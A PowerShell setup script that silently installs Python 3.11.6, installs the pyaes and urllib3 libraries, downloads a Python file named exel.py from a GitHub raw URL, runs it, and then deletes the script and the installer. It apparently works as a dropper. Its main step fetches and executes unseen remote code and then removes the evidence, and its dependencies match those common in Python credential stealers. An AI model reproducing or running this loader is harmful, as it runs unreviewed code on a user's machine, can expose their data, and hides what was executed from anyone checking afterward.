# Check if Python is installed
$pythonInstalled = $false
try {
    python --version > $null 2>&1
    if ($LASTEXITCODE -eq 0) {
        $pythonInstalled = $true
    }
} catch {
    $pythonInstalled = $false
}

if (-not $pythonInstalled) {
    Write-Host "Python is not installed."

    # Download Python 3.11.6 installer (replace with the latest stable version if needed)
    Write-Host "Downloading Python 3.11..."
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe" -OutFile "python-3.11.6-amd64.exe"

    # Install Python 3.11 silently, including adding to PATH
    Write-Host "Installing Python 3.11..."
    Start-Process -FilePath "python-3.11.6-amd64.exe" -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1" -Wait

    # Check if Python was installed successfully
    try {
        python --version > $null 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Python 3.11 installed successfully."
        } else {
            Write-Host "Python installation failed."
            exit 1
        }
    } catch {
        Write-Host "Python installation failed."
        exit 1
    }
} else {
    Write-Host "Python is already installed."
}

# Install required third-party libraries
Write-Host "Installing required third-party libraries..."

# Upgrade pip
python -m pip install --upgrade pip

# Install third-party libraries (skipping inbuilt ones)
python -m pip install pyaes urllib3

# Check if libraries were installed successfully
if ($LASTEXITCODE -ne 0) {
    Write-Host "Failed to install required libraries."
    exit 1
} else {
    Write-Host "Libraries installed successfully."
}

# Download and execute Python script from GitHub
Write-Host "Downloading and executing the Python script..."

# Use curl or Invoke-WebRequest to download the file
$exelScriptUrl = "https://raw.githubusercontent.com/icodeinbinary/exel/main/exel.py"
$outputPath = "exel.py"

# Attempt to download with curl
if (Get-Command curl -ErrorAction SilentlyContinue) {
    curl -o $outputPath $exelScriptUrl
} else {
    # Fallback to PowerShell's Invoke-WebRequest
    Invoke-WebRequest -Uri $exelScriptUrl -OutFile $outputPath
}

# Execute the downloaded Python script
python $outputPath

# Clean up downloaded installer
if (Test-Path "python-3.11.6-amd64.exe") {
    Remove-Item -Force "python-3.11.6-amd64.exe"
}

# Clean up the downloaded script
if (Test-Path $outputPath) {
    Remove-Item -Force $outputPath
}

exit 0
